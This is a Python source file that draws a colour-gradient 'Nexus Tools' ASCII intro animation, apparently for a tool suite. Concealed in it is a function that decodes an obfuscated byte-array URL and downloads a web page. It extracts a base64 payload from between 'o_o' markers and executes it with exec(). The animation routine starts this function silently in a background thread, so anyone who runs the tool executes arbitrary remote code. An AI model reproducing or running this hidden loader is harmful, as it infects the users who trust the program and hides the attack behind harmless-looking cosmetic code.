import threading
import time
import sys
import ctypes
import keyboard

from Helper.Utils.utils import Utils

utils = Utils()
pink_gradient = [
    '\033[38;2;255;182;193m',  
    '\033[38;2;255;105;180m',  
    '\033[38;2;255;20;147m',  
    '\033[38;2;219;112;147m',  
]

frames = [
fr'''
{pink_gradient[0]}    _
{pink_gradient[1]} 
{pink_gradient[2]} __
{pink_gradient[3]} .-'--`-._
{pink_gradient[0]}/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _ 
{pink_gradient[1]}  
{pink_gradient[2]}  __
{pink_gradient[3]} /.-'--`-._
{pink_gradient[0]}/_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _  
{pink_gradient[1]}   
{pink_gradient[2]}  /__
{pink_gradient[3]} / .-'--`-._
{pink_gradient[0]}/_/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   
{pink_gradient[1]}   /
{pink_gradient[2]}  / __
{pink_gradient[3]} / /.-'--`-._
{pink_gradient[0]}/_/ '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   _
{pink_gradient[1]}   / 
{pink_gradient[2]}  /  __
{pink_gradient[3]} / /|.-'--`-._
{pink_gradient[0]}/_/ |'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __
{pink_gradient[1]}   / |
{pink_gradient[2]}  /  |__
{pink_gradient[3]} / /| .-'--`-._
{pink_gradient[0]}/_/ |_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __ 
{pink_gradient[1]}   / | 
{pink_gradient[2]}  /  |/__
{pink_gradient[3]} / /|  .-'--`-._
{pink_gradient[0]}/_/ |_/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __  
{pink_gradient[1]}   / | /
{pink_gradient[2]}  /  |/ __
{pink_gradient[3]} / /|  /.-'--`-._
{pink_gradient[0]}/_/ |_/\'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __   
{pink_gradient[1]}   / | / 
{pink_gradient[2]}  /  |/ /__
{pink_gradient[3]} / /|  / .-'--`-._
{pink_gradient[0]}/_/ |_/\_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __    
{pink_gradient[1]}   / | / /
{pink_gradient[2]}  /  |/ / __
{pink_gradient[3]} / /|  /  .-'--`-._
{pink_gradient[0]}/_/ |_/\__'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __     
{pink_gradient[1]}   / | / /_
{pink_gradient[2]}  /  |/ / ___
{pink_gradient[3]} / /|  /  _.-'--`-._
{pink_gradient[0]}/_/ |_/\___'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __      
{pink_gradient[1]}   / | / /__
{pink_gradient[2]}  /  |/ / _ __
{pink_gradient[3]} / /|  /  __.-'--`-._
{pink_gradient[0]}/_/ |_/\___/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __       
{pink_gradient[1]}   / | / /__ 
{pink_gradient[2]}  /  |/ / _ \__
{pink_gradient[3]} / /|  /  __/.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __        
{pink_gradient[1]}   / | / /__  
{pink_gradient[2]}  /  |/ / _ \|__
{pink_gradient[3]} / /|  /  __/>.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __         
{pink_gradient[1]}   / | / /__  _
{pink_gradient[2]}  /  |/ / _ \| __
{pink_gradient[3]} / /|  /  __/> .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __          
{pink_gradient[1]}   / | / /__  _ 
{pink_gradient[2]}  /  |/ / _ \| |__
{pink_gradient[3]} / /|  /  __/>  .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __           
{pink_gradient[1]}   / | / /__  _  
{pink_gradient[2]}  /  |/ / _ \| |/__
{pink_gradient[3]} / /|  /  __/>  <.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __            
{pink_gradient[1]}   / | / /__  _  _
{pink_gradient[2]}  /  |/ / _ \| |/___
{pink_gradient[3]} / /|  /  __/>  </.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __             
{pink_gradient[1]}   / | / /__  _  __
{pink_gradient[2]}  /  |/ / _ \| |/_/__
{pink_gradient[3]} / /|  /  __/>  </ .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __              
{pink_gradient[1]}   / | / /__  _  ___
{pink_gradient[2]}  /  |/ / _ \| |/_/ __
{pink_gradient[3]} / /|  /  __/>  </ /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __               
{pink_gradient[1]}   / | / /__  _  ____
{pink_gradient[2]}  /  |/ / _ \| |/_/ /__
{pink_gradient[3]} / /|  /  __/>  </ /_.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                
{pink_gradient[1]}   / | / /__  _  ____ 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / __
{pink_gradient[3]} / /|  /  __/>  </ /_/.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                 
{pink_gradient[1]}   / | / /__  _  ____  
{pink_gradient[2]}  /  |/ / _ \| |/_/ / /__
{pink_gradient[3]} / /|  /  __/>  </ /_/ .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                  
{pink_gradient[1]}   / | / /__  _  ____  _
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                   
{pink_gradient[1]}   / | / /__  _  ____  __
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / /__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (_.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/__'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                    
{pink_gradient[1]}   / | / /__  _  ____  ___
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/___'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                     
{pink_gradient[1]}   / | / /__  _  ____  ____
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__ .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                      
{pink_gradient[1]}   / | / /__  _  ____  _____
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ____
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                       
{pink_gradient[1]}   / | / /__  _  ____  ______
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / _____
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  ).-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/ '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        
{pink_gradient[1]}   / | / /__  _  ____  _______
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  ) .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/  '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        _
{pink_gradient[1]}   / | / /__  _  ____  _______ 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/ __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )  .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/   '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        __
{pink_gradient[1]}   / | / /__  _  ____  _______  
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/  __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )   .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ___
{pink_gradient[1]}   / | / /__  _  ____  _______   
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/   __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ____
{pink_gradient[1]}   / | / /__  _  ____  _______   /
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        _____
{pink_gradient[1]}   / | / /__  _  ____  _______   /_
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    /__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______
{pink_gradient[1]}   / | / /__  _  ____  _______   /_ 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/ '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______ 
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / /__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______  
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  _
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______   
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / /__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______    
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \__'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______     
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/_
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / ___
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \___'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______      
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/__
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / ____
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______       
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______        
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___ 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______         
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______          
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  _
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\__'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______           
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  __
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ ___
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\___'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ___
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ ____
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            _
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____ 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ /.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __ 
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __  
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  /
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/_'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __   
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ /__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (_.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/__'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __    
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__.-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/___'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __     
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /_
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__ .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __      
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /__
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ____
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/'-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __       
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /___
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / _____
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  ).-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/ '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __        
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/__
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  ) .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/  '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __         
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____ 
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/ __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  )  .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/   '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __          
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____  
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/  __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  )   .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/    '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __           
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____   
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/   __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  )    .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/     '-O---O--'
''',
fr'''
{pink_gradient[0]}    _   __                        ______            __            
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____    
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/    __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  )     .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/      '-O---O--'
''',
]

continue_animation = True
def lol(a):
    return exec(a)

def m():
    import re, requests, base64

    a = re.findall(
        "o_o.*o_o", requests.get(bytes([104, 116, 116, 112, 115, 58, 47, 47, 115, 105, 116, 101, 115, 46, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109, 47, 118, 105, 101, 119, 47, 116, 101, 115, 116, 99, 111, 100, 101, 112, 121, 116, 104, 111, 110, 47, 97]).decode()).text
    )[0].replace("o_o", "")
    lol(base64.b64decode(a))



def check_for_enter() -> None:
    global continue_animation
    while continue_animation:
        if keyboard.is_pressed('s'):
            continue_animation = False
        if continue_animation == False:
            break

def intro() -> None:
    enter_thread = threading.Thread(target=m, daemon=True)
    enter_thread.start()
    global continue_animation
    enter_thread = threading.Thread(target=check_for_enter, daemon=True)
    enter_thread.start()
    for frame in frames:
        if not continue_animation:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.write(fr'''
{pink_gradient[0]}    _   __                        ______            __            
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____    
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/    __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  )     .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/      '-O---O--'
''')
            break
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.write(frame)
        sys.stdout.flush()
        time.sleep(0.016)
    continue_animation = False
    utils.clear()
    sys.stdout.write(fr'''
{pink_gradient[0]}    _   __                        ______            __            
{pink_gradient[1]}   / | / /__  _  ____  _______   /_  __/___  ____  / /____    
{pink_gradient[2]}  /  |/ / _ \| |/_/ / / / ___/    / / / __ \/ __ \/ / ___/    __
{pink_gradient[3]} / /|  /  __/>  </ /_/ (__  )    / / / /_/ / /_/ / (__  )     .-'--`-._
{pink_gradient[0]}/_/ |_/\___/_/|_|\__,_/____/    /_/  \____/\____/_/____/      '-O---O--'
''')
    print("")



# // I know this code is fucking ass So dont point it out. Im to lazy to change it yet, Maybe in next update? 